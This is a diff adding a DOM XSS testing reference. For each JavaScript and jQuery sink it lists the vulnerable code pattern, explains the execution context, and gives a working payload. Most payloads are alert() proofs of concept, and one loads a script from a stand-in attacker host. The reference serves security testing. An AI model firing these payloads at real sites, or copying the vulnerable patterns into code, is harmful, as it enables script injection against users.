@@ -1,0 +1,143 @@
+# DOM XSS Sink Reference
+# For each sink: vulnerable code pattern, payload, and execution context
+# Use as a quick reference during DOM XSS testing
+# All payloads verified against Chrome 120+ / Firefox 120+
+
+# ===== innerHTML =====
+# Vulnerable pattern:
+#   document.getElementById('out').innerHTML = location.hash.slice(1);
+# Payload:
+#   https://victim.com/page#<img src=x onerror=alert(document.domain)>
+# Execution context: HTML parsing — all HTML is evaluated, script tags blocked in modern browsers,
+# but event handler attributes (onerror, onload, etc.) execute normally.
+<img src=x onerror=alert(document.domain)>
+
+# ===== outerHTML =====
+# Vulnerable pattern:
+#   targetElement.outerHTML = userInput;
+# Payload: Same as innerHTML — element is replaced with parsed HTML
+# Note: assigning outerHTML to the element being listened to can break event listeners.
+<img src=x onerror=alert(document.domain)>
+
+# ===== document.write =====
+# Vulnerable pattern:
+#   document.write('<p>' + location.search + '</p>');
+# Payload (in URL query string, URL-decoded by browser before document.write):
+#   ?q=<script>alert(document.domain)</script>
+# Execution context: document.write reopens the document stream — <script> tags execute.
+<script>alert(document.domain)</script>
+
+# ===== document.writeln =====
+# Vulnerable pattern:
+#   document.writeln(decodeURIComponent(location.hash.slice(1)));
+# Same as document.write — <script> tags execute.
+<script>alert(document.domain)</script>
+
+# ===== insertAdjacentHTML =====
+# Vulnerable pattern:
+#   element.insertAdjacentHTML('beforeend', userInput);
+# Payload:
+<img src=x onerror=alert(document.domain)>
+
+# ===== eval =====
+# Vulnerable pattern:
+#   eval(location.hash.slice(1));
+# Payload (URL fragment — not URL-encoded by browsers):
+#   https://victim.com/page#alert(document.domain)
+# Execution context: eval executes the string as JavaScript directly.
+alert(document.domain)
+
+# ===== setTimeout (string form) =====
+# Vulnerable pattern:
+#   setTimeout(location.hash.slice(1), 100);
+# Payload:
+#   https://victim.com/page#alert(document.domain)
+# Note: setTimeout with a function reference (not a string) is NOT vulnerable.
+#   setTimeout(() => userInput, 100)  → safe
+alert(document.domain)
+
+# ===== setInterval (string form) =====
+# Vulnerable pattern:
+#   setInterval(userInput, 1000);
+# Same as setTimeout string form.
+alert(document.domain)
+
+# ===== new Function =====
+# Vulnerable pattern:
+#   new Function(userInput)();
+# Equivalent to eval. Payload:
+alert(document.domain)
+
+# ===== location.href =====
+# Vulnerable pattern:
+#   location.href = userInput;  // userInput from URL param
+# Payload — javascript: scheme:
+#   ?redirect=javascript:alert(document.domain)
+# Execution context: browsers navigate to the javascript: URI and execute it in the current origin.
+javascript:alert(document.domain)
+
+# ===== location.assign =====
+# Vulnerable pattern:
+#   location.assign(document.getElementById('link').dataset.href);
+# Same behavior as location.href assignment.
+javascript:alert(document.domain)
+
+# ===== location.replace =====
+# Vulnerable pattern:
+#   location.replace(userInput);
+# Same as location.href — javascript: protocol executes.
+javascript:alert(document.domain)
+
+# ===== window.open =====
+# Vulnerable pattern:
+#   window.open(userInput, '_blank');
+# javascript: URI opens a new window and executes in the opener's origin context.
+javascript:alert(document.domain)
+
+# ===== element.src (script element) =====
+# Vulnerable pattern:
+#   const s = document.createElement('script');
+#   s.src = userInput;
+#   document.body.appendChild(s);
+# Payload — attacker-controlled JS file URL:
+https://attacker.com/evil.js
+
+# ===== element.setAttribute('href') =====
+# Vulnerable pattern:
+#   anchor.setAttribute('href', userInput);
+#   // victim clicks the link
+# Payload:
+javascript:alert(document.domain)
+
+# ===== jQuery.html() =====
+# Vulnerable pattern:
+#   $('#output').html(userInput);
+# jQuery parses and inserts HTML — same as innerHTML. Payload:
+<img src=x onerror=alert(document.domain)>
+
+# ===== jQuery.append() / prepend() / after() / before() =====
+# Vulnerable pattern:
+#   $('body').append(userInput);
+# Same as $.html() for attacker-controlled string input.
+<img src=x onerror=alert(document.domain)>
+
+# ===== jQuery.$(selector) with attacker input =====
+# Vulnerable pattern:
+#   $(location.hash);  // e.g., hash = #<img src=x onerror=alert(1)>
+# jQuery's $ function creates DOM elements from HTML strings if input starts with <
+# Payload (URL fragment):
+#   https://victim.com/page#<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.domain)>
+
+# ===== srcdoc attribute =====
+# Vulnerable pattern:
+#   iframe.srcdoc = userInput;
+# srcdoc is parsed as a full HTML document in an opaque-origin iframe (same-origin in some contexts).
+<img src=x onerror=alert(document.domain)>
+
+# ===== postMessage receiver (no origin check) =====
+# Vulnerable pattern:
+#   window.addEventListener('message', e => { document.body.innerHTML = e.data; });
+# Payload — sent from attacker's page via:
+#   targetWindow.postMessage('<img src=x onerror=alert(1)>', '*');
+<img src=x onerror=alert(document.domain)>
